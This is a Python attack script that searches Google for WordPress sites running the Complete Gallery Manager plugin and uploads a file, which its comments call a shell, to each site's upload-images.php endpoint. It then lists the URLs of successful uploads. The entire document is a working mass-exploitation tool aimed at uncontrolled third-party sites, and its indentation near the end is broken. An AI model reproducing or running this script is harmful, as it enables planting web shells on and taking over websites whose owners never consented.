#!/usr/bin/python3

from gScrape import gScrape as Google
from StringIO import StringIO
import pycurl, json
import re

def scrape_dork( dork, number_of_links = 100 ):
    """
        Query google with our dork and return a list 
        of links containing at max number_of_links
    """
    google = Google( query = dork, links = number_of_links )
    return google.links()


def upload_shell( url, path ):
    post_data = [
        ( "qqfile", ( pycurl.FORM_FILE, path ) ),
        ( "pt_req", "b50771db1a4defa9082045979c1e3cfb" ),
    ]

    upload_location = []

    io = StringIO()

    curl = pycurl.Curl()
    curl.setopt( curl.FOLLOWLOCATION, 1 )
    curl.setopt( curl.VERBOSE, 1 )
    curl.setopt( curl.POST, 1 )
    curl.setopt( curl.URL, url )
    curl.setopt( curl.HTTPPOST, post_data )
    curl.setopt( curl.WRITEFUNCTION, io.write )

    print "[+] Uploading to {0}".format( url )
    curl.perform()
    curl.close()

    # Snag our post return
    #       (hehe, its json encoded for easier consumption)
    try:
        tmp = io.getvalue()
        buf = json.loads( tmp )
    except ValueError as FailedUpload:
        # Assign a null dict to buf to trigger our
        # latter exception on failed upload.
        buf = dict()
    finally:
        io.close()

    # Check our post results
    try:
        if buf[ 'success' ] == True:
            upload = [ True, ]
            print '\t[!] Upload Sucessful. <3'
            for results in buf[ 'r_data' ]:
                print '\t\t\\___ {}'.format( results[ 'url' ] )
                upload.append( results[ 'url' ] )
            return upload
    except KeyError as FailedUpload:
        pass

    print '\t[-] Failed.'
    return [ False, ]


def main():
	"""

	    Scrape the results of our dork into a list

	"""
	data = scrape_dork( 'allinurl:/wp-content/plugins/complete-gallery-manager/', 100 )
	print '\t[+] Scrape Complete, First 3 Results will be displayed\n\t |_____ {}\n\t |_____ {}\n\t |_____ {}'.format( data[0], data[1], data[2] )

	"""

	    Strip the uri for the upload page path,
	    and attempt to upload our shell.

	"""

	# This will be our photo from earlier,
	# but could just as easily be a shell
	path_to_shell = "/home/github/gScrape/simple.txt"

	for link in data[:10]:

		url     = "{}/frames/upload-images.php".format( re.search( "(^http.*complete\-gallery\-manager)", link ).groups()[0] )
		results = upload_shell( url, path_to_shell )

    		if results[ 0 ] == True:
        	# We can log our results here for later
	        # perusal, whether that be a flat file
	        # or through sqlite.
	        	print "\t\t\\___ INSERT INTO logging_table VALUES (\n\t\t\t\t\t '{}',\n\t\t\t\t\t '{}' );\n\n".format( url, results[ 1 ] )

if __name__ == '__main__':
	main()
